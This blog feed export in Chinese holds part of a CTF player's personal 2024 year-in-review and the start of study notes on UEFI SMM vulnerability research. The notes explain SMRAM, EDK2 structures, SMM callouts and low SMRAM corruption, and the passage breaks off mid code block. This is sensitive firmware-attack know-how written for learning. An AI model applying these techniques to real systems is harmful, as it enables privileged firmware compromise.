src="/2024/12/31/2024/13.jpg" class="" title="我的图图呢"><p>圈圈虽然一直都忙的抽不开身，可是他依然很珍惜和家人们的每一次旅行，因为他知道这样的机会在慢慢的减少。<br>国赛后的一个月里圈圈也忘记他干了什么，勉强记得他学了 golang 的语法、出了几道很阴间的 pwn 题、和 unk 一起肝了一个月的逆向……  </p><p>圈圈这个假期提前了一个月回校，和 HvAng、Chimedal 去爬海拔 1296 km 的惠州罗浮山。本以为可以很快登顶，没想到 HvAng、Chimedal 平时缺乏运动，再加上中途下了好几次大雨，爬了好久才登顶。<br>山顶的风景也是真的好看的说，上图：  </p><img src="/2024/12/31/2024/14.jpg" class="" title="我的图图呢"><p>是谁爬不动了鸭🤣🤣：  </p><img src="/2024/12/31/2024/15.jpg" class="" title="我的图图呢"><p>移动的蛋白质：  </p><img src="/2024/12/31/2024/16.jpg" class="" title="我的图图呢"><p>下山的时候运气好看到了彩虹：  </p><img src="/2024/12/31/2024/17.jpg" class="" title="我的图图呢"><p>大二下圈圈好像也没干什么，没事干帮帮 crazyman 打打国际赛，基本上整个学期都在搞开发，首先是 golang web 开发，学了 gin、gorm、gRPC、go-micro 等东西，然后找个了由 golang 博客项目练了一下手。后面发现搞开发只搞 golang 好像也不太合适，然后又回到了大二上学的 spring boot（圈圈是觉得这个 web 框架写起来非常的方便，可是集成度太高了，写起来总感觉没有逻辑），继续自己找项目练手。其间也很幸运的加入到了 W&amp;M 联合战队，既然收留了圈圈，那圈圈就为他卖命把。  </p><p>这个学期圈圈也是成功当上了华南师范大学 Sloth 战队的队长了，以前刚加入 Sloth 的时候一直想着怎么谋权篡位哈哈哈。当上队长后感觉挺累的，开始关注每一个队员的学习情况，并给他们学习的建议，可是效果往往都是很难达到圈圈的期望，渐渐的圈圈的发现他说话的语气越来越强硬，最后圈圈也是看开了，觉得学习这玩意靠别人拿枪指着没什么意义，后面圈圈还是让队员们自由发展，不过还是会积极回答他们提出的问题并给出一定的建议。  </p><p>这个学期圈圈也懒的刷比赛了，以前刷比赛是为了保研加分，后面发现这样子真的太消耗时间了，而且圈圈累死累活打的比赛的分不如很多人打几个水赛类的容易，感觉保研顶多保本校，外校基本没什么可能，而圈圈并不想保本校。所以经历了很长时间的心里斗争，最后还是选择考研，圈圈这么做只是为了专精于计算机的一两个领域，而不想每个东西都会一点而不精（当然也有人能够在多个方向上专精，圈圈真的很崇拜他们😇）。  </p><p>国庆节的时候得知初中同学月月鸟服兵役结束了，所以叫上了焦哥一起吃个饭，没想到多年未见的油条也来了🥰🥰🥰<br>跟着军爷早起看了一部充满红色正能量的电影，然后老司机焦哥载我们几位去华为小镇附近散步。  </p><img src="/2024/12/31/2024/22.jpg" class="" title="我的图图呢"><p>可是进不去😇😅，路上也聊了很多。多年未见，甚是怀念。高中和大学都太卷了，感觉都没有留下什么特别值得回忆的事情（当然也很幸运认识到了更多的人，也找到了自己新的爱好）。还记得初中毕业前级长在级会上说的话：在他读书的时光里，初中是最快乐最值得回忆的🥹  </p><p>这学期除了平时的上课学习外好像也没干什么事情，也打了几次线下赛：  </p><p>跟着 W&amp;M 去南京打强网拟态：   </p><img src="/2024/12/31/2024/18.jpg" class="" title="我的图图呢"><p>猜猜哪个是圈圈😋  </p><p>比赛时旁边是烧卖（而且圈圈旁边坐的是 tel 师傅🥹），压力拉满的说  </p><img src="/2024/12/31/2024/34.jpg" class="" title="我的图图呢"><p>在回酒店的车上调试 io_uring 想抢血（拍摄 by unk）：  </p><img src="/2024/12/31/2024/26.jpg" class="" title="我的图图呢"><p>可惜大B哥受伤了没来呜呜呜😭😭😭。拟态的题感觉奇奇怪怪的，CTF 打完后就不知道干什么了。无人机没打明白，和我平时做的 IOT 不一样，然后什么车联网啊什么的比赛前说是看去年的报道做题，然后发现和去年基本上都不一样。于是圈圈就用 nmap、fscan、msf 什么的一顿操作瞎搞了 3 天…… 以后的拟态圈圈还是留在线上支援吧😅，线下机会留给 IOT 👴去  </p><p>由于比赛时间和网鼎杯冲撞了，所以圈圈第三天晚上就和 Xp0int 的 xswlhhh 师傅✈去贵阳了，留下了 unk 一个人独守战场呜呜呜😭😭。网鼎杯的过程就不想说了，只能说圈圈极度脑抽，不然 Sloth 可能就进决赛了😇😇😇，不说别的，上图：<br>打完比赛后赛场外的夜景：  </p><img src="/2024/12/31/2024/19.jpg" class="" title="我的图图呢"><p>然后和毕业的师兄师姐们去吃饭，七个人点了个十人餐，十六个菜，太恐怖了🤣🤣🤣（panz0e 快出来背锅）  </p><img src="/2024/12/31/2024/35.jpg" class="" title="我的图图呢"><p>晚上和 V&amp;N 的兄弟们去唱K（V&amp;N 好声音）：  </p><img src="/2024/12/31/2024/20.jpg" class="" title="我的图图呢"><p>卧槽喝不动了，这群人怎么这么能喝😨  </p><img src="/2024/12/31/2024/37.jpg" class="" title="我的图图呢"><p>也总算了见到 eeee 师傅了呜呜呜🥹🥹🥹<br>还有圈圈想说的是，xswlhhh 和 cnily03 师傅可以出道了吧，太能唱了。<br>此时酒店和圈圈同一间房间的 HvAng 醒来：圈圈人捏🤔🤯😨😰😱  </p><p>爬山见到了猴子大王🙈🙉🙊🐵（一群）：  </p><img src="/2024/12/31/2024/21.jpg" class="" title="我的图图呢"><p>不得不说这几天圈圈还是过的非常开心的:)  </p><p>接下来就是郑州的强网杯，圈圈第一次了解到的网络安全比赛就是强网杯，没想到居然能够有机会来打决赛。只能说尽力了…… pwn 可以说已经打完了（全是常规的用户态 pwn 🥹：屌丝菜单题以及傻逼 qvm 的傻逼远程环境😇）  </p><img src="/2024/12/31/2024/29.jpg" class="" title="我的图图呢"><p>上面左二是圈圈（别给我看见有人专门去强网杯相册里去找这张图片😡<br>emmm…… 这里插一嘴，圈圈在强网杯给 inkey 师傅盒的连底裤都不剩了😱😱😱  </p><img src="/2024/12/31/2024/36.png" class="" title="我的图图呢"><p>盒圈圈技能点数拉满⬆⬆⬆⬆⬆⬆⬆⬆⬆⬆⬆  </p><p>只能说打的很难受，realworld 真的不会打（ltp 其实会打，可是当时没看😅），那种无助和绝望，以及看到别的队伍一直上去挑战的压力，圈圈也许一辈子都不会忘记吧😔。  </p><p>打完后去酒店找广东联队 S1uM4i 他们要鼠标垫，拿了好几张。  </p><img src="/2024/12/31/2024/30.jpg" class="" title="我的图图呢"><p>因为太重不方便拿，所以就送了好几张给别人🤣<br>只能说，郑州对于一个广东人来说是真的冷，打完比赛的那天晚上他们说要去看黄河，那就去吧 :)<br>途中经过一个什么不夜城，可是灯什么的都关了，感觉就像是在恐怖游戏里面一样  </p><img src="/2024/12/31/2024/31.jpg" class="" title="我的图图呢"><p>然后圈圈他们走去黄河的路上也是非常的黑  </p><img src="/2024/12/31/2024/32.jpg" class="" title="我的图图呢"><p>到了后面直接是灯光都没了<br>只能说天上非常多的星星，应该是没有光污染的原因。好想拍下来，可是手机相机水平有限😅<br>到黄河边了：  </p><img src="/2024/12/31/2024/33.jpg" class="" title="我的图图呢"><p>不知道这个是神魔东西，可是当时 unk 看得很认真🤔  </p><img src="/2024/12/31/2024/41.jpg" class="" title="我的图图呢"><p>圈圈一整个晚上都很自责，一直在质问自己为什么一道 realworld 都没有做出来，为什么又在拖后腿！😔<br>在从黄河回酒店的车上播放着 Legends Never Die，圈圈看着窗外闪烁的灯光，他下定决心，他要回来复仇😡👊👊，他打算沉淀个两年，然后回来征服 realworld 😡👊👊  </p><p>第二天老早就起床出发赶飞机，记得当时好像是 0~3°，冷死圈圈这个广东人了要🥶。走的时候路上也没什么车，感觉十分的安静  </p><img src="/2024/12/31/2024/39.jpg" class="" title="我的图图呢"><p>只能说圈圈听不懂这边的人讲话的口音，去买个牛奶问小卖部的老板问了半天没听懂他在讲什么😨  </p><h2 id="关于友谊"><a href="#关于友谊" class="headerlink" title="关于友谊"></a>关于友谊</h2><p>圈圈一直把友谊看着很重，可是这里不得不说那些微信、QQ 单删的人真的很另人无语和感到幼稚😅😅😅<br>某天晚上圈圈心血来潮想看看有多少人微信单删他，结果发现有 10 多人。圈圈想了半天，和你们无冤无仇，而且曾经没有什么过节，你单删尼玛呢？有事情不会沟通？外表成年心理小学生？😅😅😅<br>可是总的来说，这一年还是认识了很多的人，交到了很多的朋友  </p><img src="/2024/12/31/2024/53.jpg" class="" title="我的图图呢"><h2 id="一些不如意"><a href="#一些不如意" class="headerlink" title="一些不如意"></a>一些不如意</h2><p>如果要用两个字来评价 2024 年，圈圈会说：难崩😔。<br>圈圈的 2024 年过的并不如意，基本每天都生活在高压的环境中（这并不局限于学习和比赛方面），压力既有别人给的也有自己给的，不过感觉大部分都是自己给自己加的。圈圈的情绪经常很低落，特别是 11 月底到年末这段时间里简直低的离谱（可是平时还是尽力在外面表现得自己一切正常，真是个双面人啊😇），有的时候就想直接睡觉然后什么事情都不想干（极度低落的时候会发现自己很容易困，感觉能够一次性睡好几天）。情绪低落时有时会去找郭飞、焦佬、eeee 聊天（真的挺感谢他们🥹），可是每个人现在都很忙，情绪的排解还是要靠自己。一到晚上就很容易 emo，圈圈他也不知道他自己到底怎么了，感觉是时候找个时间放下所有事情出去走走放松一下了，可惜也找不到这个时间，事情太多了<br>在初中和高中哦的时候圈圈有很多的好友，每到寒暑假基本每天都能一起出去吃早餐然后一起夜骑，可是现在每个人都要忙自己的事情，寒暑假能够见一面已经变得十分的奢侈😔😔  </p><p>有一些话圈圈听了无数遍：会来的、会成的、会……。可是过了这么久，也没见到过这个“会”的出现，上次那个“会赢的”已经变成 2.5 了🤡。  </p><p>很多时候圈圈都在尽力的说服自己，有的事情说服了，想通了，看开了，可还是非常的难受。  </p><p>还刚上大学的时候圈圈充满活力，想要拿很多奖，想要很高的绩点，想要保研什么的，可是不知不觉的圈圈逐渐失去了动力，虽然脚步一直都没有停下来，但已经失去了当时热情和动力，总感觉奖拿不拿都无所谓了，除了读研好像也没有什么理想和目标，就像是一个傀儡一样日复一日干着自己说服自己觉得很重要的事情😔。  </p><p>还记得 12 月 21 号那天圈圈彻底破防了，情绪低落到无法忍受，于是他放下了身边的所有事情，打算一个人出去走走😭<br>出校门的时候天还是亮的：  </p><img src="/2024/12/31/2024/46.jpg" class="" title="我的图图呢"><p>走着走着天就不知不觉的变暗了。路过废弃的铁路：  </p><img src="/2024/12/31/2024/47.jpg" class="" title="我的图图呢"><p>十分安静的街道：  </p><img src="/2024/12/31/2024/48.jpg" class="" title="我的图图呢"><p>感觉这里景色挺不错的 :)  </p><img src="/2024/12/31/2024/49.jpg" class="" title="我的图图呢"><p>走了半天后心里没那么难受了，刚好郭飞路过华师顺便给圈圈带了一份酸奶，然后圈圈和郭飞喝了点烧酒（雪碧+烧酒）后就回去了  </p><img src="/2024/12/31/2024/50.jpg" class="" title="我的图图呢"><p>回到宿舍有点头晕，遍倒头就睡了😇<br>挺感谢那天有很多人在鼓励圈圈，让他有了继续奋斗下去的动力🥹  </p><img src="/2024/12/31/2024/52.jpg" class="" title="我的图图呢"><p>圈圈在 11.30 开始决定要做出点改变，到底是什么让圈圈要做出这个决定以及发生了什么改变（细心的人可能会发现那段时间开始圈圈确实和以前变的有一点不一样了），有机会再说吧……  </p><p>圈圈觉得再继续这样下去就真要完蛋了，所以他打算考完期末后要找个时间彻底放空大脑，抛弃各种屁事，远离压力好好放松一下，然后再认真思考自己到底想要什么，重新树立目标，最后卷土重归来👊👊👊  </p><h2 id="一些想说的话"><a href="#一些想说的话" class="headerlink" title="一些想说的话"></a>一些想说的话</h2><p>在这一年里，圈圈很感谢家人的支持和关爱，没有他们圈圈无法走到今天；感谢 Csome 师兄的指导，让圈圈能在学习路上少走很多弯路；感谢 xtx、korey0sh1、sekiro 师傅在比赛中与圈圈一起对抗 pwn 题、感谢 eeee、unknown、郭飞、黑焦佬、pazuris 、saofeia 在圈圈无聊和 emo 时陪他聊天、感谢标哥带圈圈征战数学建模比赛、感谢室友的三辆电动车让圈圈解放双脚😋；感谢 Sloth 的大哥们带圈圈打进国内 CTF 赛事的线下赛；感谢 V&amp;N 的出现让圈圈度过了低谷和瓶颈期；感谢龙哥给予的线下赛机会（可是没打好呜呜呜😭）；感谢 W&amp;M 的大哥们比赛带圈圈飞；感谢 S1uM4i 给予的关爱（能让圈圈水群🥹）；以及感谢屏幕前的你抽出时间读完圈圈的碎碎念……  </p><h2 id="对于新的一年"><a href="#对于新的一年" class="headerlink" title="对于新的一年"></a>对于新的一年</h2><p>新的一年感觉就是考研吧（考哪？iie？北邮？WHU？留给时间去做选择吧），其实也挺难受的，没想到还要再次回高三的状态去准备应试考试。圈圈有时候挺羡慕那些能够稳定保外校那些人，他们能在圈圈考研的时间里学更多有用更加符合实际的东西。圈圈在新的一年里还会有机会参加比赛嘛🥹，他真的很享受在赛场中战斗的感觉🥹  </p><p>上面是圈圈这几年最想完成的事情（进度会同步到博客的 about 里），猜猜他 2025 年能完成几个😇（最少也要实现一件事情吧🥹）<br>写到最后也发现没有什么好说的（这个时候歌刚好播放到 Head In The Clouds，回忆真是会令人伤感，不知不觉眼眶已经湿润），感觉还是要对未来充满希望，相信一切都会变得越来越好，愿一切能够如期而至吧 :)  </p><img src="/2024/12/31/2024/24.jpg" class="" title="我的图图呢"><p>会赢嘛？  </p><img src="/2024/12/31/2024/25.jpg" class="" title="我的图图呢">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>UEFI SMM 漏洞挖掘与利用</title>
      <link href="/2024/12/14/uefi/"/>
      <url>/2024/12/14/uefi/</url>
      
        <content type="html"><![CDATA[<h2 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h2><p>内核学不下去了，php 和 v8 研究了挺长时间也没搞懂，然后想起了第一次参加华为 hws 时讲的就是 UEFI 安全。当时还是个 crypto + misc 手，什么都没有听懂，所以打算在考研前再重新学习一遍，同时也当作是征战 RealWorld CTF 的第一步把（笑<br>让我感到庆幸的是网上讲的比较好的文章还挺多，让我少走很多的弯路，这篇博客可以当作是我的学习笔记。  </p><h2 id="UEFI-SMM-常见漏洞挖掘与利用思路"><a href="#UEFI-SMM-常见漏洞挖掘与利用思路" class="headerlink" title="UEFI SMM 常见漏洞挖掘与利用思路"></a>UEFI SMM 常见漏洞挖掘与利用思路</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>既然说到 UEFI 固件漏洞挖掘，那肯定要先知道 UEFI 是个什么东西，下面的介绍来自于网络：</p><blockquote><p>UEFI是英文Unified Extensible Firmware Interface 的缩写，翻译成中文就是“统一可拓展固件接口”。它是一种新一代的固件接口标准，取代了传统的 BIOS（Basic Input&#x2F;Output System）标准。<br>在计算机启动时初始化硬件设备、检测系统配置、加载操作系统和应用程序等。与传统的 BIOS 相比，UEFI 具有更多的功能和优势，如支持更大的硬盘容量、更快的启动速度、更多的安全功能、更好的图形界面等。 </p></blockquote><p>简单的来说，就是电脑开机时用来启动操作系统的程序。（感觉这个说法有点问题）<br>UEFI 存在的目的就是为开发者创造一个统一，便捷的启动环境。<br>UEFI 会在计算机启动阶段与运行阶段提供很丰富的服务来供开发者调用。 </p><img src="/2024/12/14/uefi/13.png" class="" title="我的图图呢">   <p>EDK2全称是EFI Development Kit II，是第二代 UEFI 的官方开发库。如果把全称打出来，就是 Extended Firmware Interface Development Kit II。EDK2 是 UEFI 标准的一份实现源码。  </p><p>SSM 是系统管理模式 System Management mode 的缩写，是 Intel 在 80386SL 之后引入 x86 体系结构的一种 CPU 的执行模式。系统管理模式只能通过系统管理中断（System Management Interrupt, SMI）进入，并只能通过执行 RSM 指令退出。在 SMM 模式下一切被都屏蔽，包括所有的中断。SMM 模式下的执行的程序被称作 SMM 处理程序，所有的 SMM 处理程序只能在称作系统管理内存（System Management RAM,SMRAM）的空间内运行。可以通过设置 SMBASE 的寄存器来设置 SMRAM 的空间。<br>SMM 拥有自己的存储空间，称为 SMRAM，可以防止其他模式对其进行访问。<br>SMM 的处理程序只能在 SMRAM 里面运行，所以了解 SMRAM 的结构非常重要。这是出于安全的考虑，毕竟 SMM 有最高的优先级，如果在哪儿都可以运行，那么其它的程序改动了内存里的一点东西，也会影响到 SMM，如果这个改动是恶意的，那后果就不堪设想。<br>结构图如下：  </p><img src="/2024/12/14/uefi/1.png" class="" title="我的图图呢">  <p>SMRAM 的大小不是无限大的，它最初只有 64KB，其起始地址是 SMBASE （这个值保存在一个专门的寄存器中），在 SMBASE+0x8000H 处开始存放的是 SMI 的中断处理程序。而在 SMRAM 的高地址处存放着处理器进入 SMM 时的状态信息，这些信息在处理器退出 SMM 时会被恢复到处理器中。  </p><p>系统表（SystemTable）是 edk2 提供的一个最重要也是最基础的数据结构之一，它是沟通内核和应用&#x2F;驱动的桥梁。通过系统表，应用程序和驱动才能够访问到内核和硬件资源。系统表包含了如下信息：  </p><ul><li>表头</li><li>固件信息</li><li>标准输入设备，标准输出设备，标准错误输出设备</li><li>启动服务表</li><li>运行时服务表</li><li>系统配置表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">CHAR16 *                   FirmwareVendor;       <span class="comment">/*    24     8 */</span></span><br><span class="line">UINT32                     FirmwareRevision;     <span class="comment">/*    32     4 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XXX 4 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">EFI_HANDLE                 ConsoleInHandle;      <span class="comment">/*    40     8 */</span></span><br><span class="line">EFI_SIMPLE_TEXT_INPUT_PROTOCOL * ConIn;          <span class="comment">/*    48     8 */</span></span><br><span class="line">EFI_HANDLE                 ConsoleOutHandle;     <span class="comment">/*    56     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * ConOut;        <span class="comment">/*    64     8 */</span></span><br><span class="line">EFI_HANDLE                 StandardErrorHandle;  <span class="comment">/*    72     8 */</span></span><br><span class="line">EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL * StdErr;        <span class="comment">/*    80     8 */</span></span><br><span class="line">EFI_RUNTIME_SERVICES *     RuntimeServices;      <span class="comment">/*    88     8 */</span></span><br><span class="line">EFI_BOOT_SERVICES *        BootServices;         <span class="comment">/*    96     8 */</span></span><br><span class="line">UINTN                      NumberOfTableEntries; <span class="comment">/*   104     8 */</span></span><br><span class="line">EFI_CONFIGURATION_TABLE *  ConfigurationTable;   <span class="comment">/*   112     8 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size: 120, cachelines: 2, members: 13 */</span></span><br><span class="line"><span class="comment">/* sum members: 116, holes: 1, sum holes: 4 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_SYSTEM_TABLE;</span><br></pre></td></tr></table></figure><p>这里我们主要关注 BootServices，里面有一些我们用得到的函数：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">EFI_TABLE_HEADER           Hdr;                  <span class="comment">/*     0    24 */</span></span><br><span class="line">EFI_RAISE_TPL              RaiseTPL;             <span class="comment">/*    24     8 */</span></span><br><span class="line">EFI_RESTORE_TPL            RestoreTPL;           <span class="comment">/*    32     8 */</span></span><br><span class="line">EFI_ALLOCATE_PAGES         AllocatePages;        <span class="comment">/*    40     8 */</span></span><br><span class="line">EFI_FREE_PAGES             FreePages;            <span class="comment">/*    48     8 */</span></span><br><span class="line">EFI_GET_MEMORY_MAP         GetMemoryMap;         <span class="comment">/*    56     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">EFI_ALLOCATE_POOL          AllocatePool;         <span class="comment">/*    64     8 */</span></span><br><span class="line">EFI_FREE_POOL              FreePool;             <span class="comment">/*    72     8 */</span></span><br><span class="line">EFI_CREATE_EVENT           CreateEvent;          <span class="comment">/*    80     8 */</span></span><br><span class="line">EFI_SET_TIMER              SetTimer;             <span class="comment">/*    88     8 */</span></span><br><span class="line">EFI_WAIT_FOR_EVENT         WaitForEvent;         <span class="comment">/*    96     8 */</span></span><br><span class="line">EFI_SIGNAL_EVENT           SignalEvent;          <span class="comment">/*   104     8 */</span></span><br><span class="line">EFI_CLOSE_EVENT            CloseEvent;           <span class="comment">/*   112     8 */</span></span><br><span class="line">EFI_CHECK_EVENT            CheckEvent;           <span class="comment">/*   120     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">EFI_INSTALL_PROTOCOL_INTERFACE InstallProtocolInterface; <span class="comment">/*   128     8 */</span></span><br><span class="line">EFI_REINSTALL_PROTOCOL_INTERFACE ReinstallProtocolInterface; <span class="comment">/*   136     8 */</span></span><br><span class="line">EFI_UNINSTALL_PROTOCOL_INTERFACE UninstallProtocolInterface; <span class="comment">/*   144     8 */</span></span><br><span class="line">EFI_HANDLE_PROTOCOL        HandleProtocol;       <span class="comment">/*   152     8 */</span></span><br><span class="line"><span class="type">void</span> *                     Reserved;             <span class="comment">/*   160     8 */</span></span><br><span class="line">EFI_REGISTER_PROTOCOL_NOTIFY RegisterProtocolNotify; <span class="comment">/*   168     8 */</span></span><br><span class="line">EFI_LOCATE_HANDLE          LocateHandle;         <span class="comment">/*   176     8 */</span></span><br><span class="line">EFI_LOCATE_DEVICE_PATH     LocateDevicePath;     <span class="comment">/*   184     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">EFI_INSTALL_CONFIGURATION_TABLE InstallConfigurationTable; <span class="comment">/*   192     8 */</span></span><br><span class="line">EFI_IMAGE_LOAD             LoadImage;            <span class="comment">/*   200     8 */</span></span><br><span class="line">EFI_IMAGE_START            StartImage;           <span class="comment">/*   208     8 */</span></span><br><span class="line">EFI_EXIT                   Exit;                 <span class="comment">/*   216     8 */</span></span><br><span class="line">EFI_IMAGE_UNLOAD           UnloadImage;          <span class="comment">/*   224     8 */</span></span><br><span class="line">EFI_EXIT_BOOT_SERVICES     ExitBootServices;     <span class="comment">/*   232     8 */</span></span><br><span class="line">EFI_GET_NEXT_MONOTONIC_COUNT GetNextMonotonicCount; <span class="comment">/*   240     8 */</span></span><br><span class="line">EFI_STALL                  Stall;                <span class="comment">/*   248     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">EFI_SET_WATCHDOG_TIMER     SetWatchdogTimer;     <span class="comment">/*   256     8 */</span></span><br><span class="line">EFI_CONNECT_CONTROLLER     ConnectController;    <span class="comment">/*   264     8 */</span></span><br><span class="line">EFI_DISCONNECT_CONTROLLER  DisconnectController; <span class="comment">/*   272     8 */</span></span><br><span class="line">EFI_OPEN_PROTOCOL          OpenProtocol;         <span class="comment">/*   280     8 */</span></span><br><span class="line">EFI_CLOSE_PROTOCOL         CloseProtocol;        <span class="comment">/*   288     8 */</span></span><br><span class="line">EFI_OPEN_PROTOCOL_INFORMATION OpenProtocolInformation; <span class="comment">/*   296     8 */</span></span><br><span class="line">EFI_PROTOCOLS_PER_HANDLE   ProtocolsPerHandle;   <span class="comment">/*   304     8 */</span></span><br><span class="line">EFI_LOCATE_HANDLE_BUFFER   LocateHandleBuffer;   <span class="comment">/*   312     8 */</span></span><br><span class="line"><span class="comment">/* --- cacheline 5 boundary (320 bytes) --- */</span></span><br><span class="line">EFI_LOCATE_PROTOCOL        LocateProtocol;       <span class="comment">/*   320     8 */</span></span><br><span class="line">EFI_INSTALL_MULTIPLE_PROTOCOL_INTERFACES InstallMultipleProtocolInterfaces; <span class="comment">/*   328     8 */</span></span><br><span class="line">EFI_UNINSTALL_MULTIPLE_PROTOCOL_INTERFACES UninstallMultipleProtocolInterfaces; <span class="comment">/*   336     8 */</span></span><br><span class="line">EFI_CALCULATE_CRC32        CalculateCrc32;       <span class="comment">/*   344     8 */</span></span><br><span class="line">EFI_COPY_MEM               CopyMem;              <span class="comment">/*   352     8 */</span></span><br><span class="line">EFI_SET_MEM                SetMem;               <span class="comment">/*   360     8 */</span></span><br><span class="line">EFI_CREATE_EVENT_EX        CreateEventEx;        <span class="comment">/*   368     8 */</span></span><br><span class="line"><span class="comment">/* size: 376, cachelines: 6, members: 45 */</span></span><br><span class="line"><span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125; EFI_BOOT_SERVICES;</span><br></pre></td></tr></table></figure><p>启动时服务与运行时服务中为固件编写者提供了许多功能。gBS 与 gRT 是两个全局变量，其分别指向 BootService 与 RuntimeService。其中，操作系统只能访问 RuntimeService，而 BootLoader 则既可以访问 BootService 也可以访问 RuntimeService。  </p><h3 id="常见漏洞与利用"><a href="#常见漏洞与利用" class="headerlink" title="常见漏洞与利用"></a>常见漏洞与利用</h3><p>虽然理论上 SMM 代码与外界隔离，但实际上，在许多情况下，非 SMM 代码可以触发甚至影响 SMM 内部运行的代码。由于 SMM 具有复杂的架构和大量“移动部件”，因此攻击面非常广泛，其中包括在通信缓冲区中传递的数据、NVRAM 变量、支持 DMA 的设备等。  </p><h4 id="SMM-Callouts"><a href="#SMM-Callouts" class="headerlink" title="SMM Callouts"></a>SMM Callouts</h4><p>这是最基本的 SMM 漏洞类别，发生在 SMM 代码调用位于 SMRAM 边界之外的函数时。最常见的调用场景是 SMI 处理程序试图在其操作中调用 UEFI 启动服务或运行时服务。具有操作系统级权限的攻击者可以在触发 SMI 之前修改这些服务所在的物理页面，从而在调用受影响的服务后劫持特权执行流。<br>下面的流程图来自：<a href="https://www.c7zero.info/stuff/ANewClassOfVulnInSMIHandlers_csw2015.pdf">https://www.c7zero.info/stuff/ANewClassOfVulnInSMIHandlers_csw2015.pdf</a></p><img src="/2024/12/14/uefi/2.png" class="" title="我的图图呢">  <p>从第四代 Core 微架构 ( Haswell ) 开始，Intel CPU 支持一项名为 SMM_Code_Chk_En 的安全功能。如果启用此安全功能，则一旦 CPU 进入 SMM，就禁止其执行位于 SMRAM 区域之外的任何代码，有点类似于 linux 用户态的 NX 保护。  </p><h4 id="Low-SMRAM-Corruption"><a href="#Low-SMRAM-Corruption" class="headerlink" title="Low SMRAM Corruption"></a>Low SMRAM Corruption</h4><p>在正常情况下，用于将参数传递给 SMI 处理程序的通信缓冲区不得与 SMRAM 重叠。此限制的理由很简单：如果不是这种情况，那么每当 SMI 处理程序将一些数据写入通信缓冲区时，它也会在此过程中修改 SMRAM 的某些部分，这是不可取的。  </p><img src="/2024/12/14/uefi/3.png" class="" title="我的图图呢">  <p>在 EDK2 中，负责检查给定缓冲区是否与 SMRAM 重叠的函数称为 SmmIsBufferOutsideSmmValid()。每次调用 SMI 时，都会在通信缓冲区上调用此函数以强制执行此限制。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 